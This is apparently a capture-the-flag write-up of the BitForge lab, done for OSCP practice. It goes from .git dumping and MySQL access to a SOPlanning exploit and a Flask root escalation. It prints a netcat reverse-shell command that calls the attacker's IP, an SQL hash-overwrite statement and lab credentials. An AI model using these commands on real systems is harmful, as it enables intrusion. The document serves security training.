---
title: PG-BitForge
published: 2025-05-19
toc: true
draft: false
tags:
  - "git"
  - "git-dumper"
  - "MySQL"
  - "OSCP Prep"
---

```
Scope:
192.168.102.186
```

# Objectives

:::note
This lab challenges learners to exploit a web application's misconfigurations, retrieve sensitive data, and escalate privileges to gain root access. Using tools to explore exposed .git directories, compromise the SOPlanning application, and abuse misconfigured permissions, you will develop your skills in enumeration, exploitation, and privilege escalation.
:::

In this challenge, learners will exploit a series of vulnerabilities in the BitForge environment, including exposed .git directories, weak password storage mechanisms, and a vulnerable SOPlanning application. The lab culminates in exploiting a writable Flask application to escalate privileges and gain root access, testing skills in enumeration, exploitation, and lateral movement.

## Attack BitForge

- Enumerate the target system to identify open ports and subdomains.

- Exploit exposed .git directories to retrieve sensitive configuration files and credentials.
   
- Gain authenticated access to the SOPlanning application and leverage CVE-2022-37386 to execute arbitrary code.

- Escalate privileges by exploiting misconfigured cron jobs and writable application files.
   
- Achieve root access by modifying application behavior via a Flask-based privilege escalation vector.

# Recon

## Nmap

```bash
sudo nmap -sC -sV bitforge -sT -vvvv -p- -Pn -T5 --min-rate=5000

PORT     STATE  SERVICE    REASON       VERSION
22/tcp   open   ssh        syn-ack      OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http       syn-ack      Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://bitforge.lab/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-git: 
|   192.168.102.186:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: created .env to store the database configuration 
3306/tcp open   mysql      syn-ack      MySQL 8.0.40-0ubuntu0.24.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.40_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.40_Auto_Generated_CA_Certificate
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.40-0ubuntu0.24.04.1
|   Thread ID: 29
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, LongPassword, SupportsTransactions, IgnoreSigpipes, FoundRows, ODBCClient, SupportsCompression, Speaks41ProtocolNew, InteractiveClient, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: +SbaN=J9\x1F?MM.FC:q\x12?d
|_  Auth Plugin Name: caching_sha2_password
```

## 80/TCP - HTTP

We find a `.git` repo using `nmap` so let's check it out:

### git-dumper

![](attachments/9675bc06a7e25ddc0aa073d81e870319.png)

Let's check out what we get.

Using `git log` we can check the commit history:

![](attachments/162195e4a237595e5108054483263f36.png)

Interesting! Let's check out this commit.

![](attachments/24226edc4e4ec5aae0179dcdcc867552.png)

Hell yeah.

```
BitForgeAdmin
B1tForG3S0ftw4r3S0lutions
```

We can try it out on the `MySQL` server since they're creds for a `db`.

## 3306/TCP - MySQL

![](attachments/d7e15ea4a05bd392bf7344e19b1ef9cd.png)

The creds work and we're in!

I notice 2 non-default databases namely `bitforge_customer_db` as well as `soplanning`.

I decide to check out the latter first.

![](attachments/cd1561296f4b255264733ed3333d89ac.png)

![](attachments/36a3545a69ee516d78ce1dbdc49a9c54.png)

![](attachments/a7a512ea5a1f3fdc5bd1161d7052d3b0.png)

I wasn't able to crack the hash but also noticed a `cle` part in the table, not knowing what it was I started checking online where I found [this post](https://blog.quarkslab.com/pwn-everything-bounce-everywhere-all-at-once-part-2.html) containing info on how to get access to **SoPlanning**:

![](attachments/56b565b4f1275830d1821724d22eb1ac.png)



## SoPlanning
### MySQL UPDATE on creds

I found a subdomain here:

![](attachments/103ecb301cc0c608e4295ce0e4eb091e.png)

When I clicked on it I had to add the `plan.bitforge.lab` subdomain to my `/etc/hosts` list.

![](attachments/6a9855d36d6e7fd9458745fa9c7f9360.png)

Another login page, however this time for employees.

Since we still didn't know the exact cleartext password I got kinda stuck.

>[!info]
>I then found out online that I could try and `UPDATE` the password within `MySQL` to fit any other password of my liking, that way I wouldn't have to go to the trouble of cracking the existing hash.

Within the source code I found the standard `SHA-1` password for `admin`:

![](attachments/49db844ee3695a8bb62b5cec50424a30.png)

According to online this password hash SHOULD match `admin`:

![](attachments/1595743bca719e4e6f9f1c4ebc8fb4f2.png)

Let's try and overwrite it.

```sql
UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';
```

![](attachments/5c3c7a673c86cf1c1738793ad24bef18.png)

It succeeded! Let's try to log in.

### RCE PoC

![](attachments/ca6f691c10c90ceff3508fe953c4398d.png)

We successfully log in!

Let's give the following PoC a shot:

![](attachments/0dd1d1b4b32c9c28a9539714a5cee33e.png)

I use `searchsploit` to get the PoC and launch `gobuster` again to verify whether all the endpoints in the PoC match:

![](attachments/8a6af37d471b66946f1168fbb9f34941.png)

![](attachments/5648c389262849907e1ca9536e61f1d5.png)

![](attachments/ce6ca83e91f1837537c676c85b9c0be4.png)

Looks good enough, let's launch it.

# Foothold
## Shell as www-data

![](attachments/100be6f0c96f515b75fb7d9e9633b3e8.png)

Awesome, I upgrade my shell:

```bash
busybox nc 192.168.45.185 3306 -e bash
```

![](attachments/2827364c18194d3f6af7867ed57cc5f0.png)

![](attachments/18f83b034f2260a5bacb32c8fc04bf4a.png)

I notice there are 2 users on this target, *jack* and *ubuntu*.

![](attachments/2ec4690abba8461021635e6a46ee92d9.png)

At the moment I am not allowed to view either one.

![](attachments/49367a2598c24e8b264a8d9e8c134289.png)

![](attachments/82443734c6e9a596b25017681a87b51e.png)

We find something interesting!

![](attachments/5d3f290b96e5dd70924a8ae0b82547de.png)

Awesome, we can proceed with it as *Jack*, first we need access as him.

I download over `pspy64` to see the running processes:

![](attachments/d3b663e43078a8c022e6240a638bf3d9.png)

Luckily for me, amongst the results is the cleartext password for *jack*!

```
jack
j4cKF0rg3@445
```

## Lateral Movement

I log in to `ssh` as *jack*:

![](attachments/c4ee63ca095aa2d7ef9b441fe36cfccb.png)

###  local.txt

![](attachments/f759037dcac43479c50457ee839fffa0.png)

![](attachments/3d1f52a97fba80c0a80080a3db3f15a2.png)

# Privilege Escalation
## Flask app

Returning to the `flask` app we should figure out what to do with it.

![](attachments/eedba61066c2e452be53ddce51e95867.png)

Turns out we can run it as *root*?

![](attachments/3aad1272ac821e50233d0ddf530a8fda.png)

![](attachments/2a4f4a34fd7aae4661660ccaec9aa9b0.png)

So it is essentially a bash script that runs `app.py`, got it

Let's go ahead and change the contents of `app.py`:

![](attachments/383e27fe1847987bc4f21fde0370cf67.png)

![](attachments/8bcc673dc5ed46778ca1403d6de26c3c.png)

![](attachments/9533becb78eb9bb01fe88e5317d53546.png)

EZ PZ!

### proof.txt

![](attachments/a16a525597a61c0d4ab8b58a738d0302.png)

---


